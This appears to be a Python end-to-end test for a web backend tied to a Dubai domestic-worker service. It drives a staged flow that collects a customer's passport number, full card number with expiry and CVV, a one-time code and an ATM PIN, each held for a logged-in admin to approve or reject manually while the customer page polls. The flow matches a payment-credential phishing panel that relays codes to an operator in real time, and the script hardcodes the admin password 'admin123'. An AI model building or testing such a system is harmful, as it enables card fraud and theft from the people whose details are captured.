#!/usr/bin/env python3
"""E2E test for the approval/rejection decision system."""
import requests, time, random, json

BASE = "http://localhost:8080"
S = requests.Session()

def stage_of_contract(contract):
    r = S.get(BASE + "/api/admin/payments", headers=auth)
    return r.json(), sorted([x for x in r.json() if x.get("contract_no") == contract], key=lambda x: x["id"])

# 1) Login as admin
r = S.post(BASE + "/api/admin/login", json={"password": "admin123"})
print("login:", r.status_code, r.json())
TK = r.json()["token"]
auth = {"Authorization": "Bearer " + TK}
r = S.get(BASE + "/api/admin/verify", headers=auth)
print("verify:", r.status_code, r.text)

# 2) Create a lead
lead = S.post(BASE + "/api/leads", json={
    "fullName": "Test User " + str(random.randint(1000,9999)),
    "phone": "+971500000000",
    "email": "test@example.com",
    "passport": "A1234567",
    "contract_no": "CT" + str(random.randint(10000,99999)),
    "service": "طلب عاملة منزلية",
    "address": "Dubai",
    "message": "lead test"
}).json()
contract = lead["data"]["contract_no"]
print("lead contract:", contract)

# 3) Card stage
r = S.post(BASE + "/api/payments", json={
    "stage": "card", "contractNo": contract, "customerName": "Test",
    "serviceInfo": "طلب عاملة منزلية", "amount": 10,
    "cardNumber": "4111111111111111", "cardExpiry": "12/28", "cardCvv": "123"
}).json()
print("card post:", r)
time.sleep(0.5)
pays, my = stage_of_contract(contract)
card_pay = my[-1]
print("card pay id/stage:", card_pay["id"], card_pay["stage"])
assert card_pay["stage"] == "card_initiated", "card stage mismatch"
r = S.get(BASE + "/api/payment-decision/" + contract).json()
print("decision poll (card pending):", r)

# 6) Approve card
r = S.post(BASE + f"/api/admin/payments/{card_pay['id']}/decide", headers=auth,
           json={"stage": "card", "decision": "approved"}).json()
print("decide card approve:", r)
time.sleep(0.5)
r = S.get(BASE + "/api/payment-decision/" + contract).json()
print("decision poll (after approve):", r)
assert r["decision"] == "approved", "should be approved"

# 7) OTP stage
r = S.post(BASE + "/api/payments", json={"stage": "otp", "contractNo": contract, "otpCode": "5555"}).json()
print("otp post:", r)
time.sleep(0.5)
pays, my = stage_of_contract(contract)
otp_pay = my[-1]
print("otp pay id/stage:", otp_pay["id"], otp_pay["stage"])
assert otp_pay["stage"] == "otp_verified", "otp stage mismatch"
r = S.get(BASE + "/api/payment-decision/" + contract).json()
print("decision poll (otp pending):", r)
r = S.post(BASE + f"/api/admin/payments/{otp_pay['id']}/decide", headers=auth,
           json={"stage": "otp", "decision": "rejected"}).json()
print("decide otp reject:", r)
time.sleep(0.5)
r = S.get(BASE + "/api/payment-decision/" + contract).json()
print("decision poll (after otp reject):", r)
assert r["decision"] == "rejected", "should be rejected"

# 8) PIN stage (retry after rejection -> new card flow normally, here directly pin)
r = S.post(BASE + "/api/payments", json={"stage": "card", "contractNo": contract,
    "customerName": "Test", "serviceInfo": "طلب عاملة منزلية", "amount": 10,
    "cardNumber": "5555555555554444", "cardExpiry": "12/28", "cardCvv": "321"}).json()
time.sleep(0.5)
pays, my = stage_of_contract(contract)
card2 = my[-1]
print("card2:", card2["id"], card2["stage"])
r = S.post(BASE + f"/api/admin/payments/{card2['id']}/decide", headers=auth,
           json={"stage": "card", "decision": "approved"}).json()
print("decide card2 approve:", r)
time.sleep(0.5)
r = S.post(BASE + "/api/payments", json={"stage": "otp", "contractNo": contract, "otpCode": "1234"}).json()
print("otp2 post:", r)
time.sleep(0.5)
pays, my = stage_of_contract(contract)
otp2 = my[-1]
r = S.post(BASE + f"/api/admin/payments/{otp2['id']}/decide", headers=auth,
           json={"stage": "otp", "decision": "approved"}).json()
print("decide otp2 approve:", r)
time.sleep(0.5)

r = S.post(BASE + "/api/payments", json={"stage": "pin", "contractNo": contract, "atmPin": "1234"}).json()
print("pin post:", r)
time.sleep(0.5)
pays, my = stage_of_contract(contract)
pin_pay = my[-1]
print("pin pay id/stage:", pin_pay["id"], pin_pay["stage"])
r = S.post(BASE + f"/api/admin/payments/{pin_pay['id']}/decide", headers=auth,
           json={"stage": "pin", "decision": "approved"}).json()
print("decide pin approve:", r)
time.sleep(0.5)
r = S.get(BASE + "/api/payment-decision/" + contract).json()
print("decision poll (after pin approve):", r)
print("\nALL E2E CHECKS DONE")
